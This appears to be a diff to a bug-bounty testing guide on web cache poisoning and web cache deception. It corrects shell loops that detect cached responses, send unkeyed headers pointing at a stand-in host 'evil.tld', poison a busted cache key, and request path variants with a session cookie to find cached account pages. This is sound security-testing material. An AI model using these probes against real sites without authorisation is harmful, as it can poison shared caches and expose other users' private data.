@@ -23,12 +23,17 @@ the production key. Triagers accept this; it is the standard for responsible cac
 **1. Confirm there is a cache and learn how it reports itself.**
 
 ```bash
+CB="zpcb=$RANDOM$RANDOM"          # fix the buster ONCE - both requests must share one cache key
 for i in 1 2; do
-  curl -skI "https://$H/?zpcb=$RANDOM" \
+  curl -skI "https://$H/?$CB" \
     | grep -iE 'x-cache|cf-cache-status|age|via|x-served-by|cache-control|vary|x-varnish|x-drupal-cache'
   echo ---
 done
 ```
+
+`$RANDOM` re-expands on every use, so a buster written inside the loop gives each request its own
+key and the pair can never show MISS->HIT or a rising `Age`. You would read your own two misses as
+"no caching on that path" and kill a live target.
 
 | Header | Reading |
 |---|---|
@@ -41,31 +46,56 @@ done
 **2. Find unkeyed inputs that change the response.** The classic technique: add a header, see it
 reflected, then see whether it survives into the cached copy.
 
+One fresh buster **and** one distinct marker per header. Reuse either and the sweep lies to you:
+if the path is cacheable at all - the precondition for this whole skill - the first probe stores a
+response under the shared key, every later probe is served from that stored copy, and one shared
+marker makes the mix-up invisible. Whichever header reflected first then makes all of them look
+positive, or a stored clean copy makes all of them look negative.
+
 ```bash
-CB="zpcb=$RANDOM$RANDOM"
-for hdr in "X-Forwarded-Host: zp91234.evil.tld" \
-           "X-Forwarded-Scheme: http" \
-           "X-Forwarded-Proto: http" \
-           "X-Forwarded-Port: 1337" \
-           "X-Host: zp91234.evil.tld" \
-           "X-Original-URL: /zp91234" \
-           "X-Rewrite-URL: /zp91234" \
-           "X-Forwarded-Server: zp91234.evil.tld" \
-           "X-HTTP-Method-Override: POST"; do
-  printf '%-44s ' "${hdr%%:*}"
-  curl -sk "https://$H/?$CB" -H "$hdr" | grep -c 'zp91234'
+for hdr in "X-Forwarded-Host: ZPM.evil.tld" \
+           "X-Host: ZPM.evil.tld" \
+           "X-Forwarded-Server: ZPM.evil.tld" \
+           "X-Original-URL: /ZPM" \
+           "X-Rewrite-URL: /ZPM"; do
+  CB="zpcb=$RANDOM$RANDOM"; M="zp$RANDOM$RANDOM"      # new key and new marker each iteration
+  printf '%-24s ' "${hdr%%:*}"
+  curl -sk "https://$H/?$CB" -H "${hdr//ZPM/$M}" | grep -c "$M"
 done
 ```
 
-A non-zero count means the header is **reflected**. The question is whether it is **keyed**:
+A non-zero count means the header is **reflected**. The scheme, proto and port headers carry no
+marker of their own, so a marker grep can never see them - score each on its own signal, against a
+baseline fetched on its own key:
 
 ```bash
-curl -sk "https://$H/?$CB" -H "X-Forwarded-Host: zp91234.evil.tld" -o /dev/null   # poison the busted key
-curl -sk "https://$H/?$CB" | grep -c 'zp91234'                                     # fetch WITHOUT the header
-# >0 means the header was unkeyed -> CONFIRMED cache poisoning on this key
+for hdr in "X-Forwarded-Proto: http" "X-Forwarded-Scheme: http" "X-Forwarded-Port: 1337"; do
+  printf '%-24s ' "${hdr%%:*}"
+  CB="zpcb=$RANDOM$RANDOM"; base=$(curl -sk "https://$H/?$CB" | grep -coE "http://$H|:1337")
+  CB="zpcb=$RANDOM$RANDOM"; with=$(curl -sk "https://$H/?$CB" -H "$hdr" | grep -coE "http://$H|:1337")
+  echo "baseline $base  with-header $with"
+done
 ```
 
-Reflected **and** unkeyed is the finding. Reflected but keyed is harmless.
+`with` above `base` means the header rewrote the links the page generates - the protocol-downgrade
+pattern below. `X-HTTP-Method-Override: POST` does **not** belong in a reflection sweep: it reflects
+nothing, and it turns your GET probe into a POST at the origin, which can fire a state-changing
+action on the target. Test method override on purpose, on a route you have established is safe, and
+never as one row of a loop.
+
+Reflected is half of it. The question is whether the header is **keyed**:
+
+```bash
+CB="zpcb=$RANDOM$RANDOM"; M="zp$RANDOM$RANDOM"
+curl -sk "https://$H/?$CB" -H "X-Forwarded-Host: $M.evil.tld" -o /dev/null   # poison the busted key
+curl -sk -D /tmp/zp.hdr -o /tmp/zp.body "https://$H/?$CB"                    # fetch WITHOUT the header
+grep -iE 'x-cache|cf-cache-status|^age' /tmp/zp.hdr                          # must say HIT, or Age > 0
+grep -c "$M" /tmp/zp.body
+```
+
+Both lines have to answer: the marker present **and** the header block showing the response came
+from cache. A marker with no cache hit means the origin echoed it again, not that the cache stored
+it. Reflected, unkeyed and served from cache is the finding. Reflected but keyed is harmless.
 
 **3. What the reflection is worth.**
 
@@ -99,10 +129,17 @@ cache stores it, then read another user's stored copy.
 for v in "/account.css" "/account.js" "/account.json" "/account;.css" "/account%23.css" \
          "/account%3F.css" "/account/.css" "/account.css/" "/account/x.css" "/account?x=.css"; do
   printf '%-22s ' "$v"
-  curl -skI "https://$H$v" -H "Cookie: session=$TOK_A" \
-    | grep -iE 'x-cache|cf-cache-status|content-type|age' | tr '\n' ' '; echo
+  curl -sk -D /tmp/zp.hdr -o /tmp/zp.body "https://$H$v" -H "Cookie: session=$TOK_A"
+  grep -iE 'x-cache|cf-cache-status|content-type|^age' /tmp/zp.hdr | tr '\n' ' '
+  echo "body $(wc -c < /tmp/zp.body) bytes"
 done
 ```
+
+Use a **GET**, never `curl -I`. HEAD is a different cache operation: several CDNs and reverse
+proxies do not store HEAD responses at all, and others answer HEAD out of an internal GET without
+populating or reporting the stored entry - so HEAD hides the very `HIT`/`Age` you came for, and
+gives false negatives on exactly the `/account`, `/settings`, `/api/me` paths that matter. The body
+is not optional either: it is where you confirm the cached copy is your own account page.
 
 If `/account.css` returns **your account page** with a `Content-Type: text/html` **and** a cache
 `HIT`/`Age`, the cache has stored authenticated content under a URL an attacker can request.
